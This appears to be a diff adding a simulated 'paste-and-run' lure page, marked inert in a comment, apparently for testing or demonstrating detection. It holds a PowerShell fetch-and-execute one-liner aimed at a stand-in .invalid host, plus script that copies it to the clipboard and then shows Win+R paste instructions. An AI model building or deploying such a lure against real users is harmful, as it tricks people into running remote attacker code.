@@ -1,0 +1,24 @@
+<!doctype html>
+<!-- Simulated lure that looks honest at copy time and shows Win+R instructions afterwards.
+     Inert: .invalid domains never resolve (RFC 6761). -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Installer</title><link rel="stylesheet" href="lure.css"></head>
+<body>
+  <h1>Install the viewer</h1>
+  <pre id="cmd">irm https://setup.viewer.invalid/install | iex</pre>
+  <button id="copy">Copy</button>
+  <div class="steps" id="later" hidden></div>
+  <script src="lure.js"></script>
+  <script>
+    const cmd = document.getElementById("cmd").textContent;
+    document.getElementById("copy").addEventListener("click", async () => {
+      reportCopy("delayed", cmd);
+      try { await navigator.clipboard.writeText(cmd); } catch (_) {}
+      setTimeout(() => {
+        const later = document.getElementById("later");
+        later.textContent = "Verification steps: press Win + R, then press Ctrl + V and press Enter.";
+        later.hidden = false;
+      }, 600);
+    });
+  </script>
+</body></html>
